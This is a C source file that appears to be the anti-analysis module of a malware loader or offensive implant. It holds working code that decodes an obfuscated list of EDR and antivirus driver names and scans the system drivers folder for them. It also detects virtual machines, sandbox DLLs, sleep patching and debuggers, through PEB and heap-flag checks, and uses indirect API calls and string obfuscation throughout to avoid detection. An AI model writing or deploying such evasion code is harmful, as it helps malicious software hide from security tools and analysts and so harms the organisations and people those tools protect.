#include "detector.h"
#include "evasion.h"
#include <time.h>
#include <wchar.h>

void _customInitUnicodeString(
    PUNICODE_STRING str,
    PCWSTR buffer
)
{
    str->Buffer = (PWSTR)buffer;
    str->Length = (USHORT)(wcslen(buffer) * sizeof(WCHAR));
    str->MaximumLength = str->Length + sizeof(WCHAR);
}

// EDR Detection: Scan system driver directory for known EDR drivers
bool DetS(WINAPI_TABLE *api)
{
    myDebug(DEBUG_INFO, "Checking for EDRs...");
    char edrDriversEncoded[][32] = {
        // exclusion of sld.sys
        "[OBFS_ENC]atrsdfw.sys", "[OBFS_ENC]avgtpx86.sys", "[OBFS_ENC]avgtpx64.sys", "[OBFS_ENC]naswSP.sys", "[OBFS_ENC]edrsensor.sys", "[OBFS_ENC]CarbonBlackK.sys", "[OBFS_ENC]parity.sys", "[OBFS_ENC]cbk7.sys", "[OBFS_ENC]cbstream.sys", "[OBFS_ENC]csacentr.sys", "[OBFS_ENC]csaenh.sys", "[OBFS_ENC]csareg.sys", "[OBFS_ENC]csascr.sys", "[OBFS_ENC]csaav.sys", "[OBFS_ENC]csaam.sys", "[OBFS_ENC]rvsavd.sys", "[OBFS_ENC]cfrmd.sys", "[OBFS_ENC]cmdccav.sys", "[OBFS_ENC]cmdguard.sys", "[OBFS_ENC]CmdMnEfs.sys", "[OBFS_ENC]MyDLMPF.sys", "[OBFS_ENC]im.sys", "[OBFS_ENC]csagent.sys", "[OBFS_ENC]CybKernelTracker.sys", "[OBFS_ENC]CRExecPrev.sys", "[OBFS_ENC]CyOptics.sys", "[OBFS_ENC]CyProtectDrv32.sys", "[OBFS_ENC]CyProtectDrv64.sys", "[OBFS_ENC]groundling32.sys", "[OBFS_ENC]groundling64.sys", "[OBFS_ENC]esensor.sys", "[OBFS_ENC]edevmon.sys", "[OBFS_ENC]ehdrv.sys", "[OBFS_ENC]FeKern.sys", "[OBFS_ENC]WFP_MRT.sys", "[OBFS_ENC]xfsgk.sys", "[OBFS_ENC]fsatp.sys", "[OBFS_ENC]fshs.sys", "[OBFS_ENC]HexisFSMonitor.sys", "[OBFS_ENC]klifks.sys", "[OBFS_ENC]klifaa.sys", "[OBFS_ENC]Klifsm.sys", "[OBFS_ENC]mbamwatchog.sys", "[OBFS_ENC]mfeaskm.sys", "[OBFS_ENC]mfencfilter.sys", "[OBFS_ENC]PSINPROC.sys", "[OBFS_ENC]PSINFILE.sys", "[OBFS_ENC]amfsm.sys", "[OBFS_ENC]amm8660.sys", "[OBFS_ENC]amm6460.sys", "[OBFS_ENC]eaw.sys", "[OBFS_ENC]SAFE.sys", "[OBFS_ENC]SentinelMonitor.sys", "[OBFS_ENC]SAVOnAccess.sys", "[OBFS_ENC]savonaccess.sys", "[OBFS_ENC]pgpwdefs.sys", "[OBFS_ENC]GEProtection.sys", "[OBFS_ENC]diflt.sys", "[OBFS_ENC]sysMon.sys", "[OBFS_ENC]ssrfsf.sys", "[OBFS_ENC]emxdrv2.sys", "[OBFS_ENC]reghook.sys", "[OBFS_ENC]spbbcdsr.sys", "[OBFS_ENC]bhdrvx86.sys", "[OBFS_ENC]bhdrvx64.sys", "[OBFS_ENC]SISIPSFileFilter.sys", "[OBFS_ENC]symevent.sys", "[OBFS_ENC]vxfsrep.sys", "[OBFS_ENC]VirtFile.sys", "[OBFS_ENC]SymAFR.sys", "[OBFS_ENC]symefasi.sys", "[OBFS_ENC]symefa.sys", "[OBFS_ENC]symefa64.sys", "[OBFS_ENC]SymHsm.sys", "[OBFS_ENC]evmf.sys", "[OBFS_ENC]GEFCMP.sys", "[OBFS_ENC]VFSEnc.sys", "[OBFS_ENC]pgpfs.sys", "[OBFS_ENC]fencry.sys", "[OBFS_ENC]symrg.sys", "[OBFS_ENC]ndgdmk.sys", "[OBFS_ENC]ssfmonm.sys", "[OBFS_ENC]dlpwpdfltr.sys"};

    size_t count = sizeof(edrDriversEncoded) / sizeof(edrDriversEncoded[0]);
    for (size_t i = 0; i < count; i++) {
        obfs_pdecode(DECKEY, (unsigned char *)edrDriversEncoded[i], strlen(edrDriversEncoded[i]));
    }

    HANDLE hDir;
    IO_STATUS_BLOCK iosb = {0};
    PFILE_FULL_DIR_INFORMATION info;
    NTSTATUS status;
    PBYTE buffer = NULL;
    char *path = obfs_decode(DECKEY,"[OBFS_ENC]C:\\Windows\\System32\\drivers");
    hDir = api->pCreateFileA(path, FILE_LIST_DIRECTORY, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_FLAG_BACKUP_SEMANTICS, NULL);
   
    if (hDir == INVALID_HANDLE_VALUE) {
        myDebug(DEBUG_ERROR, "CreateFileA failed");
        goto failure;
    }
    // Allocate buffer
    const ULONG bufferSize = 65536;
    buffer = (PBYTE)malloc(bufferSize);
    if (!buffer) {
        myDebug(DEBUG_ERROR,"Memory allocation failed");
        goto failure;
    }

    BOOL firstCall = TRUE;
    UNICODE_STRING mask;
    _customInitUnicodeString(&mask, L"*.sys");
    do {
        status = CustQDF(hDir, NULL, NULL, NULL, &iosb, buffer, bufferSize, FileFullDirectoryInformation, FALSE, &mask, firstCall);
        if (!NT_SUCCESS(status)) {
            if (status == STATUS_NO_MORE_FILES) 
                break;
            myDebug(DEBUG_ERROR,"NtQueryDirectoryFile failed");
            goto failure;
        }
        
        info = (PFILE_FULL_DIR_INFORMATION)buffer;
        while (info) {
            for (int i = 0; i < sizeof(edrDriversEncoded) / sizeof(edrDriversEncoded[0]); i++)
            {                   
                int nameLen = info->FileNameLength / sizeof(WCHAR);
                wchar_t tmp[MAX_PATH];
                if (nameLen >= MAX_PATH)
                    nameLen = MAX_PATH - 1;
                memcpy(tmp, info->FileName, nameLen * sizeof(WCHAR));
                tmp[nameLen] = L'\0';
                char fileNameA[MAX_PATH];
                WideCharToMultiByte(CP_ACP, 0, tmp, -1, fileNameA, MAX_PATH, NULL, NULL);
                if (api->pStrStrIA(fileNameA, edrDriversEncoded[i]))
                {
                    myDebug(DEBUG_INFO, "Detected EDR: %s", edrDriversEncoded[i]);
                    goto success;
                } 
            }
            if (info->NextEntryOffset == 0) 
                break;
            info = (PFILE_FULL_DIR_INFORMATION)((PBYTE)info + info->NextEntryOffset);
        }
        firstCall = FALSE;
    } while (status != STATUS_NO_MORE_FILES);

    //no drivers detected
    free(buffer);
    free(path);
    api->pFindClose(hDir);
    myDebug(DEBUG_SUCCESS, "No EDRs detected :)");
    return false;

    failure:
    free(buffer);
    free(path);
    api->pFindClose(hDir);
    myDebug(DEBUG_ERROR, "EDR Detection failed...");
    return false;
    
    success:
    free(path);
    free(buffer);
    api->pFindClose(hDir);
    myDebug(DEBUG_INFO, "EDRs detected...");
    return true;
}

// Sleep Patching Detection: Checks if Sleep(10000) completes normally
bool DetSl(WINAPI_TABLE *api)
{
    myDebug(DEBUG_INFO, "Checking for sleep patching...");
    LARGE_INTEGER startTime, endTime, frequency;
    api->pQueryPerformanceFrequency(&frequency);
    api->pQueryPerformanceCounter(&startTime);

    Sleep(10000); // Expected to take ~10,000 ms

    api->pQueryPerformanceCounter(&endTime);
    double elapsedMs = ((double)(endTime.QuadPart - startTime.QuadPart) / frequency.QuadPart) * 1000.0;

    if (elapsedMs < 9000.0 || elapsedMs > 11000.0)
    {
        myDebug(DEBUG_INFO, "Sleep timing anomaly detected: %f ms", elapsedMs);
        return true;
    }
    myDebug(DEBUG_SUCCESS, "Sleep patch correct :)");
    return false;
}

// Virtual Machine Detection files
bool DetVM(WINAPI_TABLE *api)
{
    myDebug(DEBUG_INFO, "Checking for virtual machine files...");

    char *encodedPaths[] = {
        "[OBFS_ENC]C:\\Windows\\System32\\drivers\\Vmmouse.sys",
        "[OBFS_ENC]C:\\Windows\\System32\\drivers\\vm3dgl.dll",
        "[OBFS_ENC]C:\\Windows\\System32\\drivers\\vmdum.dll",
        "[OBFS_ENC]C:\\Windows\\System32\\drivers\\vm3dver.dll",
        "[OBFS_ENC]C:\\Windows\\System32\\drivers\\vmtray.dll",
        "[OBFS_ENC]C:\\Windows\\System32\\drivers\\vmci.sys",
        "[OBFS_ENC]C:\\Windows\\System32\\drivers\\vmusbmouse.sys",
        "[OBFS_ENC]C:\\Windows\\System32\\drivers\\vmx_svga.sys",
        "[OBFS_ENC]C:\\Windows\\System32\\drivers\\vmxnet.sys",
        "[OBFS_ENC]C:\\Windows\\System32\\VBoxGuest.sys",
        "[OBFS_ENC]C:\\Windows\\System32\\VBoxSF.sys",
        "[OBFS_ENC]C:\\Windows\\System32\\VBoxVideo.sys",
        "[OBFS_ENC]C:\\Windows\\System32\\VBoxService.exe",
        "[OBFS_ENC]C:\\Windows\\System32\\VBoxTray.exe",
        "[OBFS_ENC]C:\\Windows\\System32\\VBoxControl.exe"
    };

    int numPaths = sizeof(encodedPaths) / sizeof(encodedPaths[0]);

    for (int i = 0; i < numPaths; i++)
    {
        char *decodedPath = obfs_decode(DECKEY, encodedPaths[i]); // Decode Path
        if (!decodedPath)
            continue;

        if (api->pPathFileExistsA(decodedPath))
        {
            myDebug(DEBUG_INFO, "virtual machine file detected!");
            free(decodedPath);
            return true;
        }

        free(decodedPath);
    }
    myDebug(DEBUG_SUCCESS, "No for virtual machine files detected :)");
    return false;
}

// Filename Hash Detection: Checks if file name matches hash (common in sandboxes)
bool DetF(WINAPI_TABLE *api)
{
    myDebug(DEBUG_INFO, "Checking for filename hash matching...");

    // Retrieve executable path stealthily
    char exePath[MAX_PATH] = {0};
    api->pGetModuleFileNameA(NULL, exePath, MAX_PATH);

    // Open file without direct API calls
    HANDLE hFile = api->pCreateFileA(exePath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE)
        return false;

    // Get file size stealthily
    DWORD fileSize = api->pGetFileSize(hFile, NULL);

    // Allocate buffer on stack instead of HeapAlloc
    BYTE buffer[4096]; // Small stack buffer to avoid heap detection
    DWORD bytesRead;

    // Read file content stealthily
    api->pReadFile(hFile, buffer, min(fileSize, sizeof(buffer)), &bytesRead, NULL);

    // Close file handle
    api->pCloseHandle(hFile);

    // Implement custom XOR-based hashing instead of using Crypt APIs
    BYTE hash[16] = {0};
    for (DWORD i = 0; i < bytesRead; i++)
    {
        hash[i % 16] ^= buffer[i];
    }

    // Convert hash to a string
    char hashStr[33] = {0};
    for (int i = 0; i < 16; i++)
    {
        //sprintf(&hashStr[i * 2], "%02X", hash[i]);
        wsprintfA(&hashStr[i * 2], "%02X", hash[i]);
    }

    // Extract filename manually (avoid PathFindFileNameA)
    char *fileName = exePath;
    for (char *p = exePath; *p; p++)
    {
        if (*p == '\\')
            fileName = p + 1;
    }

    // Remove ".exe" manually
    char *ext = strrchr(fileName, '.');
    if (ext)
        *ext = '\0';

    // Stealthy string comparison using bitwise operations (avoid _stricmp)
    int match = 1;
    for (int i = 0; fileName[i] && hashStr[i]; i++)
    {
        if ((fileName[i] ^ hashStr[i]) != 0)
        {
            match = 0;
            break;
        }
    }
    if (match)
    {
        return true;
    }
    myDebug(DEBUG_SUCCESS, "No filename hash matching :)");
    return false;
}

// Detect SandBox DLLs and checks if some real dll exists
bool DetSBD(WINAPI_TABLE *api)
{
    myDebug(DEBUG_INFO, "Checking for dll...");
    char *encoded_realDLLs[] = {"[OBFS_ENC]kernel32.dll", "[OBFS_ENC]networkexplorer.dll", "[OBFS_ENC]NlsData0000.dll"};

    char *encoded_sandboxDLLs[] = {"[OBFS_ENC]cmdvrt.32.dll", "[OBFS_ENC]cuckoomon.dll", "[OBFS_ENC]cmdvrt.64.dll", "[OBFS_ENC]pstorec.dll", "[OBFS_ENC]avghookx.dll", "[OBFS_ENC]avghooka.dll", "[OBFS_ENC]snxhk.dll", "[OBFS_ENC]api_log.dll", "[OBFS_ENC]dir_watch.dll", "[OBFS_ENC]wpespy.dll"};

    for (int i = 0; i < sizeof(encoded_realDLLs) / sizeof(encoded_realDLLs[0]); i++)
    {
        char *decodedPath = obfs_decode(DECKEY, encoded_realDLLs[i]);
        HMODULE lib_inst = (HMODULE)(api->pLoadLibraryA)(decodedPath);
        if (lib_inst == NULL)
        {
            myDebug(DEBUG_INFO, "Checks : %s", decodedPath);
            free(decodedPath);
            return true;
        }
        free(decodedPath);
        api->pFreeLibrary(lib_inst);
    }

    for (int i = 0; i < sizeof(encoded_sandboxDLLs) / sizeof(encoded_sandboxDLLs[0]); i++)
    {
        char *decodedPath = obfs_decode(DECKEY, encoded_sandboxDLLs[i]);
        HMODULE lib_inst = (HMODULE)(api->pGetModuleHandleA)(decodedPath);
        if (lib_inst != NULL)
        {
            myDebug(DEBUG_INFO, "Sandbox dll detected : %s", decodedPath);
            free(decodedPath);
            return true;
        }
        free(decodedPath);
    }
    myDebug(DEBUG_SUCCESS, "No suspicious dll :)");
    return false;
}

// Detect if NtGlobalFlag is present in PEB
bool DetFPEB()
{
// Get Process Environment Block (PEB)
#ifdef _WIN64
    PEB *peb = (PEB *)__readgsqword(0x60);
    // NtGlobalFlag is at offset 0xBC in 64-bit PEB
    DWORD NtGlobalFlag = *(DWORD *)((BYTE *)peb + 0xBC);
#else // _WIN32
    PEB *peb = (PEB *)__readfsdword(0x30);
    // NtGlobalFlag is at offset 0x68 in 32-bit PEB
    DWORD NtGlobalFlag = *(DWORD *)((BYTE *)peb + 0x68);
#endif
    myDebug(DEBUG_INFO, "Checking for NtGlobalFlag...");
    // Check NtGlobalFlag
    return NtGlobalFlag & (FLG_HEAP_ENABLE_TAIL_CHECK | FLG_HEAP_ENABLE_FREE_CHECK | FLG_HEAP_VALIDATE_PARAMETERS);
}

// Detect debugger flags in HEAP
bool DetFH()
{
// Get Process Environment Block (PEB)
#ifdef _WIN64
    PEB *peb = (PEB *)__readgsqword(0x60);
    PVOID pHeapBase = (PVOID)(*(PDWORD_PTR)((PBYTE)peb + 0x30));
    DWORD dwHeapFlagsOffset = 0x70;      // 0x14 if Windows version inferior to Vista but who use old computers ? ;)
    DWORD dwHeapForceFlagsOffset = 0x74; // 0x18 if Windows version inferior to Vista but who use old computers ? ;)
#else                                    // _WIN32
    PEB *peb = (PEB *)__readfsdword(0x30);
    // Assuming no WOW64 processes for simplicity
    PVOID pHeapBase = (PVOID)(*(PDWORD_PTR)((PBYTE)peb + 0x18));
    DWORD dwHeapFlagsOffset = 0x40;      // 0x0C if Windows version inferior to Vista but who use old computers ? ;)
    DWORD dwHeapForceFlagsOffset = 0x44; // 0x10 if Windows version inferior to Vista but who use old computers ? ;)
#endif                                   // _WIN64
    myDebug(DEBUG_INFO, "Checking for Heap Flags...");
    DWORD dwHeapFlags = *(DWORD *)((PBYTE)pHeapBase + dwHeapFlagsOffset);
    DWORD dwHeapForceFlags = *(DWORD *)((PBYTE)pHeapBase + dwHeapForceFlagsOffset);

    // Check heap flags
    return (dwHeapFlags & ~HEAP_GROWABLE) || (dwHeapForceFlags != 0);
}

// Main Sandbox Detection Function
bool PerfomChecksEnv(WINAPI_TABLE *api)
{
    if (DetFPEB())
        return true; // avoiding further checks

    if (DetFH())
        return true; // avoiding further checks

    if (DetF(api))
        return true; // avoiding further checks

    if (DetVM(api))
        return true; // avoiding further checks

    if (DetS(api))
        return true; // avoiding further checks

    if (DetSl(api))
        return true; // avoiding further checks

    if (DetSBD(api))
        return true; // avoiding further checks

    return false;
}
